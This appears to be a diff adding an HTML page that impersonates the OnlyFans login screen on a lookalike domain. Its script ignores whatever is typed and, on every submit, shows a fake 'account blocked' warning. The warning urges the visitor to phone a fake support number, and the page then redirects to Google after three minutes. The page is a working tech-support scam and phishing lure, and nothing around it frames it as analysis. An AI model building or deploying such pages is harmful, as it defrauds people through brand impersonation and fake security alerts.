@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+
+<script defer data-domain="onlylonds.web.app" src="https://plausible.io/js/script.js"></script>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Login Page</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        margin: 0;
+        padding: 0;
+        min-height: 100vh;
+        display: flex;
+      }
+
+      /* Desktop Styles */
+      @media (min-width: 768px) {
+        body {
+          margin-top: -52px;
+        }
+        .mob-logo {
+          display: none;
+        }
+        .left-panel {
+          flex: 1;
+          background: #00aff0;
+          display: flex;
+          flex-direction: column;
+          justify-content: center;
+          align-items: center;
+          position: relative;
+          overflow: hidden;
+        }
+
+        .background-curve {
+          position: absolute;
+          bottom: -50%;
+          left: -50%;
+          width: 200%;
+          height: 200%;
+          background: radial-gradient(
+            circle at center,
+            #00aff0 0%,
+            #0095cc 100%
+          );
+          opacity: 0.3;
+          border-radius: 50%;
+        }
+
+        .logo img {
+          width: 300px;
+        }
+
+        .tagline {
+          color: white;
+          font-size: 32px;
+          text-align: center;
+          max-width: 400px;
+          z-index: 1;
+        }
+
+        .right-panel {
+          flex: 1;
+          display: flex;
+          flex-direction: column;
+          justify-content: center;
+          align-items: center;
+          padding: 40px;
+          background-color: white;
+        }
+
+        .login-form {
+          width: 100%;
+          max-width: 400px;
+        }
+      }
+
+      /* Mobile Styles */
+      @media (max-width: 767px) {
+        body {
+          background-color: #f0f2f5;
+          align-items: start;
+        }
+
+        .left-panel {
+          display: none;
+        }
+
+        .right-panel {
+          width: 100%;
+          padding: 20px;
+        }
+
+        .logo {
+          text-align: start;
+          margin-bottom: -40px;
+        }
+
+        .logo img {
+          width: 200px;
+        }
+
+        .tagline {
+          text-align: start;
+          font-weight: normal;
+          color: #242529;
+          font-size: 28px;
+          margin-bottom: 30px;
+        }
+
+        .login-form {
+          background: white;
+          padding: 20px;
+          border-radius: 8px;
+          box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+      }
+
+      /* Common Styles */
+      .form-title {
+        font-size: 22px;
+        margin-bottom: 20px;
+      }
+
+      .form-group {
+        margin-bottom: 15px;
+      }
+
+      input {
+        width: 100%;
+        padding: 12px;
+        border: 1px solid #ddd;
+        border-radius: 8px;
+        font-size: 16px;
+        box-sizing: border-box;
+      }
+
+      button {
+        width: 100%;
+        padding: 12px;
+        background-color: #00aff0;
+        color: white;
+        border: none;
+        border-radius: 50px;
+        cursor: pointer;
+        font-size: 16px;
+        margin-bottom: 15px;
+      }
+
+      .social-btn {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-bottom: 10px;
+      }
+
+      .x-btn {
+        background-color: #1da1f2;
+      }
+
+      .google-btn {
+        background-color: #4285f4;
+      }
+
+      .terms {
+        text-align: center;
+        margin-top: 15px;
+        font-size: 12px;
+        color: #666;
+      }
+
+      .links {
+        display: flex;
+        justify-content: space-between;
+        margin: 15px 0;
+        font-size: 14px;
+      }
+
+      a {
+        color: #00aff0;
+        text-decoration: none;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="left-panel">
+      <div class="background-curve"></div>
+      <div class="logo">
+        <img
+          src="https://companieslogo.com/img/orig/onlyfans_BIG.D-30548c1a.png?t=1720244494"
+          alt="Logo"
+        />
+      </div>
+      <h1 class="tagline">Sign up to support your favorite creators</h1>
+    </div>
+    <div class="right-panel">
+      <div class="mob-logo">
+        <div class="logo">
+          <img
+            src="https://logos-world.net/wp-content/uploads/2022/03/OnlyFans-Logo.png"
+            alt="Logo"
+          />
+        </div>
+      </div>
+      <h1 class="tagline">Sign up to support your favorite creators</h1>
+      <div class="login-form">
+        <h3 class="form-title">Log in</h3>
+        <form id="login-form">
+          <div class="form-group">
+            <input type="email" placeholder="Email" required />
+          </div>
+          <div class="form-group">
+            <input type="password" placeholder="Password" required />
+          </div>
+          <button type="submit">LOG IN</button>
+          <div
+            id="error-message"
+            style="
+              color: #a94442;
+              background-color: #f2dede;
+              border: 1px solid #ebccd1;
+              padding: 10px;
+              margin-top: 8px;
+              text-align: center;
+              border-radius: 4px;
+              display: none;
+            "
+          >
+            Yours Account access has been blocked due to suspicious login
+            attempt. Contact our customer support at
+            <a
+              href="tel:+18082556940"
+              style="color: blue; text-decoration: underline"
+              >+1 808-255-6940</a
+            >.to verify and unlock your account.
+          </div>
+        </form>
+        <div class="terms">
+          By logging in and using our service, you agree to our
+          <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>,
+          and confirm that you are at least 18 years old.
+        </div>
+        <div class="links">
+          <a href="#">Forgot password?</a>
+          <a href="#">Sign up</a>
+        </div>
+        <div class="social-login">
+          <button class="social-btn x-btn">SIGN IN WITH X</button>
+          <button class="social-btn google-btn">SIGN IN WITH GOOGLE</button>
+          <button class="social-btn passwordless-btn">
+            PASSWORDLESS SIGN IN
+          </button>
+        </div>
+      </div>
+    </div>
+    <script>
+      document
+        .getElementById("login-form")
+        .addEventListener("submit", function (event) {
+          event.preventDefault();
+          document.getElementById("error-message").style.display = "block";
+          setTimeout(function () {
+            window.location.href = "https://www.google.com";
+          }, 180000);
+        });
+    </script>
+  </body>
+</html>
